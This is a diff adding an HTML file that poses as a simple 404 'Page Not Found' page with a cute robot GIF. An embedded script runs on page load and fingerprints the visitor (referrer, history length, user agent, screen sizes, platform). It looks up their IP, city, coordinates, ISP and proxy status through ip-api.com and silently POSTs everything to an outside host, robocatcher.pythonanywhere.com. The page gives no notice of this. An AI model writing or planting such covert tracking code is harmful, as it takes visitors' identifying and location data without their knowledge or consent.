@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>404 - Page Not Found</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f3f3f3;
+        text-align: center;
+      }
+      .container {
+        margin: 100px auto;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      }
+      h1 {
+        font-size: 48px;
+        color: #333;
+      }
+      p {
+        font-size: 18px;
+        color: #666;
+      }
+      .robot-gif {
+        max-width: 100%;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>404 - Page Not Found</h1>
+      <p>Oops! The page you're looking for doesn't exist.</p>
+      <img
+        class="robot-gif"
+        src="https://media.giphy.com/media/Ps89uHS7n72j6/giphy.gif"
+        alt="Cute Robot GIF"
+      />
+    </div>
+    <script>
+      var info = {
+        referrer: document.referrer,
+        previousSites: history.length,
+        browserName: navigator.appName,
+        browserEngine: navigator.product,
+        browserVersion1a: navigator.appVersion,
+        browserVersion1b: navigator.userAgent,
+        browserLanguage: navigator.language,
+        browserOnline: navigator.onLine,
+        browserPlatform: navigator.platform,
+        javaEnabled: navigator.javaEnabled(),
+        sizeScreenW: screen.width,
+        sizeScreenH: screen.height,
+        sizeDocW: document.width,
+        sizeDocH: document.height,
+        sizeInW: innerWidth,
+        sizeInH: innerHeight,
+        sizeAvailW: screen.availWidth,
+        sizeAvailH: screen.availHeight,
+        scrColorDepth: screen.colorDepth,
+        scrPixelDepth: screen.pixelDepth,
+      };
+
+      // Make a request to ip-api.com
+      fetch(
+        'http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query,currency'
+      )
+        .then((response) => response.json())
+        .then((data) => {
+          info = { ...info, ...data };
+          info['ip'] = info['query'];
+          delete info['query'];
+
+          fetch('https://robocatcher.pythonanywhere.com', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(info),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                throw new Error('Network response was not ok');
+              }
+              return response.json();
+            })
+            .then((responseData) => {
+              // Handle the successful response data here
+              return;
+            })
+            .catch((error) => {
+              // Handle errors here
+              console.error('Error:', error);
+            });
+        })
+        .catch((error) => {
+          console.error('Error:', error);
+        });
+    </script>
+  </body>
+</html>
